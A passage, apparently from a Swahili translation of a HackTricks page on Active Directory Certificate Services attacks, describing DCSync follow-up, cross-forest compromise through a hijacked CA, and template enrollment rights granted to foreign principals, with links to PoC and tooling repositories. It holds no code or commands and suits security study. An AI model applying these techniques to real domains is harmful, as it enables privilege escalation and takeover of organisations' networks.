- Kwa sababu certificate ina-map kwa **Domain Controller account**, hatua zinazofuata zinaweza kujumuisha **certificate-based Kerberos auth**, **DCSync**, na matumizi tena ya **machine NT hash** iliyopatikana.<sup>[[2]](#references)</sup>

## Kueleza Kuhatarisha Forests kwa Certificates kwa Kutumia Sauti ya Kutendwa

### Kuvunjwa kwa Forest Trusts na CAs Zilizoathiriwa

Configuration ya **cross-forest enrollment** imefanywa kuwa rahisi kwa kiwango kikubwa. **Root CA certificate** kutoka kwenye resource forest **huchapishwa kwenye account forests** na administrators, na certificates za **enterprise CA** kutoka kwenye resource forest **huongezwa kwenye `NTAuthCertificates` na AIA containers katika kila account forest**. Ili kuweka jambo hili wazi, mpangilio huu huipa **CA katika resource forest udhibiti kamili** juu ya forests nyingine zote ambazo inasimamia PKI. Ikiwa CA hii **itaathiriwa na attackers**, certificates za users wote katika resource na account forests zinaweza **kutengenezwa bandia nao**, na hivyo kuvunja security boundary ya forest.<sup>[[6]](#references)</sup>

### Enrollment Privileges Zinazopewa Foreign Principals

Katika mazingira yenye forests nyingi, tahadhari inahitajika kuhusu Enterprise CAs ambazo **huchapisha certificate templates** zinazoruhusu **Authenticated Users au foreign principals** (users/groups walio nje ya forest ambayo Enterprise CA ni yake) kupata **enrollment na edit rights**.\
Baada ya authentication kupitia trust, **Authenticated Users SID** huongezwa kwenye token ya user na AD. Kwa hivyo, ikiwa domain ina Enterprise CA yenye template ambayo **inawaruhusu Authenticated Users enrollment rights**, template inaweza uwezekano wa **ku-enroll-iwa na user kutoka forest tofauti**. Vilevile, ikiwa **enrollment rights zimepewa foreign principal waziwazi na template**, **cross-forest access-control relationship** huundwa kwa njia hiyo, na kumwezesha principal kutoka forest moja **ku-enroll kwenye template kutoka forest nyingine**.

Hali zote mbili husababisha **kuongezeka kwa attack surface** kutoka forest moja hadi nyingine. Settings za certificate template zinaweza kutumiwa na attacker kupata privileges za ziada katika foreign domain.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, New Authentication and Request Methods and more](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – The Tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

{{#include ../../../banners/hacktricks-training.md}}
